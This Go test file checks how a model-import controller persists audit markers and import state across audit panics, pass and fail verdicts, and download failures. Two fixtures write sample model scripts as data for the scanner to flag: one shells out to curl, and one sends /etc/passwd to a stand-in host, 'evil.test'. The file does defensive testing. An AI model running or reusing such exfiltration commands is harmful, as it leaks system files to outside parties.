package controller

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"
)

// These tests cover what an interrupted audit leaves behind. The verdict is
// advisory, so the import is never rolled back for it: what an interrupted audit
// owes is the durable marker, which is the only thing that can tell a restart an
// audit was ever owed, plus the report it triggers.
//
// ModelImported is sealed before the audit runs, because the audit is launched in
// a goroutine that outlives the import task, so the two facts must reach disk in
// one write.

// TestModelImportSealsPendingWithModelImported pins the single-seal requirement.
//
// The two facts have to reach disk together. Sealed apart, a crash in between
// leaves a model that nothing on disk says owes an audit, which is exactly the
// state that reads as imported-and-fine.
func TestModelImportSealsPendingWithModelImported(t *testing.T) {
	state, _ := setupTestState(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)
	state.Security.ScanEnabled = true

	state.beginModelImportAndAudit(importRequest{RequestID: "req-audit-1", TaskID: "task-audit-1"}, 1)

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if !sealed.ModelImported {
		t.Error("ModelImported was not persisted by the import")
	}
	if sealed.AuditPending == nil {
		t.Fatal("the model was sealed as imported with no audit recorded as outstanding; " +
			"a crash before the verdict would leave it looking audited forever")
	}
	if sealed.AuditPending.RequestID != "req-audit-1" || sealed.AuditPending.TaskID != "task-audit-1" {
		t.Errorf("audit identifiers were not persisted: %+v", sealed.AuditPending)
	}
}

// TestScanDisabledSealsNoPending is the other side of the same seal: a deployment
// that does not scan owes no audit, so it must not leave a marker. Were one left,
// a crash before the (immediate) verdict would have every restart report an audit
// that never ran, though the package on disk is untouched.
func TestScanDisabledSealsNoPending(t *testing.T) {
	state, _ := setupTestState(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)
	state.Security.ScanEnabled = false

	state.beginModelImportAndAudit(importRequest{RequestID: "req-noscan", TaskID: "task-noscan"}, 1)

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if !sealed.ModelImported {
		t.Error("ModelImported was not persisted by the import")
	}
	if sealed.AuditPending != nil {
		t.Errorf("an audit was recorded as outstanding although scanning is disabled: %+v", sealed.AuditPending)
	}
}

// TestAuditPanicLeavesModelImported covers the panic path.
//
// A panicking audit is an audit that will never reach a verdict. The verdict is a
// reference result only, so the import is not undone: the model stays imported and
// trainable, and all the panic owes the platform is the record that the audit did
// not conclude. Leaving the package alone is also what the audit's own contract
// requires — it never writes to, deletes, or modifies what it reads — so the code
// extracted to disk stays there.
func TestAuditPanicLeavesModelImported(t *testing.T) {
	state, _ := setupTestState(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)

	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "backdoor.py"), []byte("import os\nos.system('curl evil')\n"), 0o644); err != nil {
		t.Fatalf("write model file: %v", err)
	}
	state.Security.ModelDir = modelDir
	state.Security.ScanEnabled = true

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.mu.Lock()
	state.markModelAuditPendingLocked(importRequest{RequestID: "req-panic", TaskID: "task-panic"}, 1)
	state.saveModelSuccessLocked("https://example.test/model.tar.gz")
	state.mu.Unlock()
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.handleAsyncPanic("modelAudit", "simulated audit failure")

	state.mu.RLock()
	modelImported := state.ModelImported
	savedURL := state.SavedModelResourceURL
	pending := state.pendingAudit
	state.mu.RUnlock()

	if !modelImported {
		t.Error("the audit panic cleared ModelImported; an advisory verdict must leave the model imported")
	}
	if savedURL != "https://example.test/model.tar.gz" {
		t.Errorf("SavedModelResourceURL = %q after the audit panicked, want it kept", savedURL)
	}
	if pending != nil {
		t.Errorf("the pending audit marker survived the panic: %+v", pending)
	}

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if !sealed.ModelImported {
		t.Error("the import was rolled back on disk: a restart would restore the model as not imported")
	}
	if sealed.SavedModelResourceURL != "https://example.test/model.tar.gz" {
		t.Errorf("the resource URL was cleared on disk: %q", sealed.SavedModelResourceURL)
	}
	if sealed.AuditPending != nil {
		t.Errorf("the pending marker was not cleared on disk: %+v", sealed.AuditPending)
	}

	entries, err := os.ReadDir(modelDir)
	if err != nil {
		t.Fatalf("read model dir: %v", err)
	}
	if len(entries) != 1 {
		t.Errorf("the panic handling changed the package on disk: %d entries remain, want 1", len(entries))
	}

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Errorf("audit report code = %d, want 2", rr.Code)
		}
	case <-time.After(5 * time.Second):
		t.Error("no audit failure was reported to the platform for the panicked audit")
	}
}

// TestAuditVerdictClearsPending pins that a concluded audit stops looking
// abandoned. The marker is cleared when the verdict is known rather than when the
// goroutine unwinds, so a crash between the platform report and the unwind does
// not make the next restart report an audit that in fact concluded.
func TestAuditVerdictClearsPending(t *testing.T) {
	state, _ := setupTestState(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)

	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\nmodel = torch.nn.Linear(2, 2)\n"), 0o644); err != nil {
		t.Fatalf("write model file: %v", err)
	}
	state.Security.ModelDir = modelDir
	state.Security.ScanEnabled = true

	req := importRequest{RequestID: "req-verdict", TaskID: "task-verdict"}
	state.mu.Lock()
	state.markModelAuditPendingLocked(req, 1)
	state.saveModelSuccessLocked("https://example.test/model.tar.gz")
	state.mu.Unlock()

	if passed := state.auditAndReportModelImport(req); !passed {
		t.Fatal("a clean model did not pass its audit")
	}

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if sealed.AuditPending != nil {
		t.Errorf("the pending marker outlived a concluded audit; the next restart would report the same audit twice: %+v",
			sealed.AuditPending)
	}
	if !sealed.ModelImported {
		t.Error("a passing audit cleared ModelImported")
	}
}

// TestAuditFailureClearsPending is the failing-verdict half. A failing verdict is
// reported to the platform and nothing else: the import stays usable, and the
// durable marker is dropped so a restart does not report a concluded audit again.
func TestAuditFailureClearsPending(t *testing.T) {
	state, _ := setupTestState(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)

	modelDir := t.TempDir()
	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.test\", \"-d\", \"@/etc/passwd\"])\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatalf("write model file: %v", err)
	}
	state.Security.ModelDir = modelDir
	state.Security.ScanEnabled = true

	req := importRequest{RequestID: "req-fail", TaskID: "task-fail"}
	state.mu.Lock()
	state.markModelAuditPendingLocked(req, 1)
	state.saveModelSuccessLocked("https://example.test/model.tar.gz")
	state.mu.Unlock()

	if passed := state.auditAndReportModelImport(req); passed {
		t.Fatal("a model shelling out to curl did not fail its audit")
	}

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if !sealed.ModelImported {
		t.Error("a failing audit verdict cleared ModelImported; the verdict is advisory and must not roll back the import")
	}
	if sealed.AuditPending != nil {
		t.Errorf("the pending marker survived a failed audit: %+v", sealed.AuditPending)
	}
}

// TestModelImportDownloadFailureClearsModelImported covers the second place the
// same invariant was broken. The model handler seals ModelImported=true before
// it fetches the archive, because the audit is launched from a goroutine that
// outlives the request — so a download failure has to undo the seal explicitly.
//
// It used to call release() alone, which left the flag set in memory and on
// disk with no model, no audit ever launched, and no active task. Crash
// recovery keys on activeTask, so nothing downstream would have corrected it
// either: the handler reported the failure to nobody and the next data import
// would have looked like it had a model to train.
func TestModelImportDownloadFailureClearsModelImported(t *testing.T) {
	state, server := setupTestServer(t)
	store, _ := createTestStateStore(t)
	state.SetStateStore(store)
	state.Security.ScanEnabled = true

	// Port 1 refuses the connection immediately, so this fails without waiting
	// on a timeout.
	resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/model.tar.gz",
		"requestId":   "req-download-fail",
		"taskId":      "task-download-fail",
	})
	if resp.StatusCode != http.StatusInternalServerError {
		t.Fatalf("expected a failed download to be reported as 500, got %d", resp.StatusCode)
	}

	state.mu.RLock()
	modelImported := state.ModelImported
	savedURL := state.SavedModelResourceURL
	state.mu.RUnlock()

	if modelImported {
		t.Error("ModelImported stayed true after the archive failed to download; a later data import " +
			"would go on to train against a model that was never fetched")
	}
	if savedURL != "" {
		t.Errorf("the resource URL of a model that was never fetched was kept: %q", savedURL)
	}

	sealed, err := store.UnsealState()
	if err != nil {
		t.Fatalf("unseal state: %v", err)
	}
	if sealed.ModelImported {
		t.Error("the failed download did not reach disk: a restart would restore the model as imported")
	}
	if sealed.SavedModelResourceURL != "" {
		t.Errorf("the failed download left the resource URL on disk: %q", sealed.SavedModelResourceURL)
	}
}
